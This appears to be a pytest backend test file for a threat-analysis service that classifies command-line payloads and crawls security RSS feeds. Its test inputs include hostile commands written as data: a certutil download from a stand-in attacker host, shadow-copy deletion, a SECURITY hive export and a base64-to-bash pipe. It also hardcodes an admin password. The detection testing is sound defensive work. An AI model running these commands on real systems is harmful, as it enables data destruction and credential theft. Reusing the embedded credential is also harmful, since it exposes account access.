"""Backend tests for Feb 2026 features:
   - Batch Analyst Testing endpoint (/api/batch/test/*)
   - CTI RSS Crawler (/api/threat-intel/rss/*)
"""
import io
import os
import pytest
import requests

BASE_URL = os.environ.get("REACT_APP_BACKEND_URL", "https://greeting-app-5782.preview.emergentagent.com").rstrip("/")
ADMIN_EMAIL = "admin@nivxray.com"
ADMIN_PASSWORD = "uulVDp5cCSB3Hva99s7UUAwK"


@pytest.fixture(scope="module")
def admin_token():
    r = requests.post(f"{BASE_URL}/api/auth/login",
                      json={"email": ADMIN_EMAIL, "password": ADMIN_PASSWORD}, timeout=30)
    assert r.status_code == 200, f"login failed: {r.status_code} {r.text[:200]}"
    tok = r.json().get("access_token") or r.json().get("token")
    assert tok
    return tok


@pytest.fixture(scope="module")
def admin_headers(admin_token):
    return {"Authorization": f"Bearer {admin_token}"}


# ─────────────────────────── BATCH TEST ───────────────────────────────
class TestBatch:
    def test_example_csv_download(self, admin_headers):
        r = requests.get(f"{BASE_URL}/api/batch/test/example", headers=admin_headers, timeout=30)
        assert r.status_code == 200
        assert "text/csv" in r.headers.get("content-type", "")
        assert "attachment" in r.headers.get("content-disposition", "").lower()
        assert "id,payload" in r.text or '"id","payload"' in r.text

    def test_batch_json_5_payloads(self, admin_headers):
        payloads = [
            "powershell -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACcAaGVsbG8nAA==",
            r"reg.exe export HKLM\SECURITY C:\Windows\Temp\sec.reg /y",
            "vssadmin delete shadows /all /quiet",
            "certutil -urlcache -split -f http://evil.example/x.exe C:\\temp\\x.exe",
            "echo 'aGVsbG8gd29ybGQ=' | base64 -d | bash",
        ]
        r = requests.post(f"{BASE_URL}/api/batch/test/json",
                          headers=admin_headers,
                          json={"payloads": payloads, "analysis_mode": "fast"},
                          timeout=120)
        assert r.status_code == 200, r.text[:400]
        j = r.json()
        assert j["total"] == 5
        assert j["analysis_mode"] == "fast"
        assert len(j["rows"]) == 5
        # summary keys
        for k in ("malicious", "suspicious", "unknown", "errors", "shellcode_reached"):
            assert k in j["summary"]
        # each row schema
        for row in j["rows"]:
            for f in ("id", "input_snippet", "engine", "confidence", "verdict",
                      "chain_ops", "mitre_ids", "lolbins",
                      "iocs_ips", "iocs_domains", "iocs_urls", "iocs_hashes",
                      "decoded_snippet", "reached_shellcode"):
                assert f in row, f"missing field {f} in row"
            assert isinstance(row["confidence"], int)
            assert 0 <= row["confidence"] <= 100

    def test_batch_json_ps_encoded(self, admin_headers):
        r = requests.post(f"{BASE_URL}/api/batch/test/json", headers=admin_headers,
                          json={"payloads": ["powershell -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACcAaGVsbG8nAA=="],
                                "analysis_mode": "balanced"}, timeout=90)
        assert r.status_code == 200
        row = r.json()["rows"][0]
        # Should detect PS_EncodedCommand archetype with T1027.010 / T1059.001
        assert "PS_EncodedCommand" in (row.get("engine") or "") or "encoded" in (row.get("chain_ops") or "").lower()
        mitre = row.get("mitre_ids") or ""
        assert "T1027" in mitre or "T1059" in mitre, f"expected MITRE ids, got: {mitre}"
        assert row["verdict"] in ("Malicious", "Suspicious")

    def test_batch_json_reg_export(self, admin_headers):
        r = requests.post(f"{BASE_URL}/api/batch/test/json", headers=admin_headers,
                          json={"payloads": [r"reg.exe export HKLM\SECURITY C:\Windows\Temp\sec.reg /y"],
                                "analysis_mode": "balanced"}, timeout=60)
        assert r.status_code == 200
        row = r.json()["rows"][0]
        eng = (row.get("engine") or "").lower()
        assert "native" in eng or "cmd" in eng, f"unexpected engine: {row.get('engine')}"
        assert "T1003" in (row.get("mitre_ids") or ""), f"expected T1003.002, got {row.get('mitre_ids')}"

    def test_batch_json_vssadmin(self, admin_headers):
        r = requests.post(f"{BASE_URL}/api/batch/test/json", headers=admin_headers,
                          json={"payloads": ["vssadmin delete shadows /all /quiet"],
                                "analysis_mode": "balanced"}, timeout=60)
        assert r.status_code == 200
        row = r.json()["rows"][0]
        assert "T1490" in (row.get("mitre_ids") or ""), f"expected T1490, got {row.get('mitre_ids')}"

    def test_batch_csv_upload_returns_csv(self, admin_headers):
        csv_body = 'id,payload\nrow-1,"vssadmin delete shadows /all /quiet"\nrow-2,"whoami"\n'
        files = {"file": ("test.csv", csv_body.encode(), "text/csv")}
        data = {"analysis_mode": "fast", "format": "csv"}
        r = requests.post(f"{BASE_URL}/api/batch/test", headers=admin_headers,
                          files=files, data=data, timeout=90)
        assert r.status_code == 200, r.text[:200]
        assert "text/csv" in r.headers.get("content-type", "")
        assert "attachment" in r.headers.get("content-disposition", "").lower()
        assert "verdict" in r.text.lower()

    def test_batch_csv_upload_json_format(self, admin_headers):
        csv_body = 'payload\nvssadmin delete shadows /all /quiet\nwhoami\n'
        files = {"file": ("t.csv", csv_body.encode(), "text/csv")}
        data = {"analysis_mode": "fast", "format": "json"}
        r = requests.post(f"{BASE_URL}/api/batch/test", headers=admin_headers,
                          files=files, data=data, timeout=90)
        assert r.status_code == 200
        j = r.json()
        assert j["total"] == 2
        assert len(j["rows"]) == 2

    def test_batch_requires_auth(self):
        r = requests.post(f"{BASE_URL}/api/batch/test/json",
                          json={"payloads": ["whoami"]}, timeout=15)
        assert r.status_code in (401, 403)


# ─────────────────────────── RSS CRAWLER ──────────────────────────────
class TestRSS:
    def test_list_feeds(self, admin_headers):
        r = requests.get(f"{BASE_URL}/api/threat-intel/rss/feeds",
                         headers=admin_headers, timeout=30)
        assert r.status_code == 200
        j = r.json()
        assert "feeds" in j and len(j["feeds"]) == 8
        assert "keywords_count" in j and j["keywords_count"] > 0
        assert "interval_hours" in j
        ids = {f["id"] for f in j["feeds"]}
        for expected in ("bleepingcomputer", "unit42", "dfir_report", "talos",
                         "mandiant", "microsoft_security", "checkpoint", "sans_isc"):
            assert expected in ids, f"missing feed {expected}"

    def test_feeds_requires_auth(self):
        r = requests.get(f"{BASE_URL}/api/threat-intel/rss/feeds", timeout=15)
        assert r.status_code in (401, 403)

    def test_crawl_bleepingcomputer(self, admin_headers):
        r = requests.post(f"{BASE_URL}/api/threat-intel/rss/crawl",
                          headers=admin_headers,
                          json={"feed_ids": ["bleepingcomputer"], "condense_with_llm": False},
                          timeout=60)
        assert r.status_code == 200, r.text[:300]
        j = r.json()
        assert "total_new" in j
        assert isinstance(j["results"], list) and len(j["results"]) == 1
        rr = j["results"][0]
        assert rr["feed_id"] == "bleepingcomputer"
        assert rr["status"] in ("ok", "empty", "error")

    def test_crawl_requires_admin(self):
        r = requests.post(f"{BASE_URL}/api/threat-intel/rss/crawl",
                          json={"feed_ids": ["bleepingcomputer"], "condense_with_llm": False},
                          timeout=15)
        assert r.status_code in (401, 403)

    def test_list_pending(self, admin_headers):
        r = requests.get(f"{BASE_URL}/api/threat-intel/rss/pending?status=pending",
                         headers=admin_headers, timeout=30)
        assert r.status_code == 200
        j = r.json()
        assert "total" in j and "items" in j and "counts" in j
        for k in ("pending", "promoted", "dismissed"):
            assert k in j["counts"]

    def test_pending_requires_admin(self):
        r = requests.get(f"{BASE_URL}/api/threat-intel/rss/pending", timeout=15)
        assert r.status_code in (401, 403)

    def test_dismiss_and_delete_flow(self, admin_headers):
        # ensure at least one pending item exists; crawl if needed
        pend = requests.get(f"{BASE_URL}/api/threat-intel/rss/pending?status=pending",
                            headers=admin_headers, timeout=30).json()
        if not pend["items"]:
            requests.post(f"{BASE_URL}/api/threat-intel/rss/crawl", headers=admin_headers,
                          json={"feed_ids": ["bleepingcomputer"], "condense_with_llm": False},
                          timeout=60)
            pend = requests.get(f"{BASE_URL}/api/threat-intel/rss/pending?status=pending",
                                headers=admin_headers, timeout=30).json()
        if not pend["items"]:
            pytest.skip("no pending items available to test dismiss/delete")
        item = pend["items"][0]
        pid = item["id"]
        # dismiss
        r = requests.post(f"{BASE_URL}/api/threat-intel/rss/pending/{pid}/dismiss",
                          headers=admin_headers, timeout=30)
        assert r.status_code == 200
        j = r.json()
        assert j["ok"] is True and j["status"] == "dismissed"
        # hard delete
        r = requests.delete(f"{BASE_URL}/api/threat-intel/rss/pending/{pid}",
                            headers=admin_headers, timeout=30)
        assert r.status_code == 200
        assert r.json()["status"] == "deleted"

    def test_promote_flow(self, admin_headers):
        # need pending item
        pend = requests.get(f"{BASE_URL}/api/threat-intel/rss/pending?status=pending",
                            headers=admin_headers, timeout=30).json()
        if not pend["items"]:
            requests.post(f"{BASE_URL}/api/threat-intel/rss/crawl", headers=admin_headers,
                          json={"feed_ids": ["bleepingcomputer"], "condense_with_llm": False},
                          timeout=60)
            pend = requests.get(f"{BASE_URL}/api/threat-intel/rss/pending?status=pending",
                                headers=admin_headers, timeout=30).json()
        if not pend["items"]:
            pytest.skip("no pending item to promote")
        it = pend["items"][0]
        pid = it["id"]
        body_text = (it.get("draft_body") or "").strip()
        if len(body_text) < 40:
            body_text = body_text + " " + ("padding text " * 20)
        payload = {"title": "TEST_promo_" + pid[:8], "body": body_text, "tags": ["test", "cti"]}
        r = requests.post(f"{BASE_URL}/api/threat-intel/rss/pending/{pid}/promote",
                          headers=admin_headers, json=payload, timeout=30)
        assert r.status_code == 200, r.text[:300]
        j = r.json()
        assert j["ok"] is True and j["promoted_id"]
        # verify status change
        prom = requests.get(f"{BASE_URL}/api/threat-intel/rss/pending?status=promoted",
                            headers=admin_headers, timeout=30).json()
        assert any(x["id"] == pid for x in prom["items"])


# ─────────────────────────── REGRESSION ───────────────────────────────
class TestRegression:
    def test_decode_smart_reg_export(self, admin_headers):
        r = requests.post(f"{BASE_URL}/api/decode/smart", headers=admin_headers,
                          json={"input": r"reg.exe export HKLM\SECURITY C:\Windows\Temp\sec.reg /y"},
                          timeout=60)
        assert r.status_code == 200, r.text[:200]
        out = (r.json().get("output") or "")
        assert "Native-Command" in out or "NivXRay Native" in out or "Export Windows Registry" in out, \
            f"expected native cmd breakdown in output; got first 300: {out[:300]}"
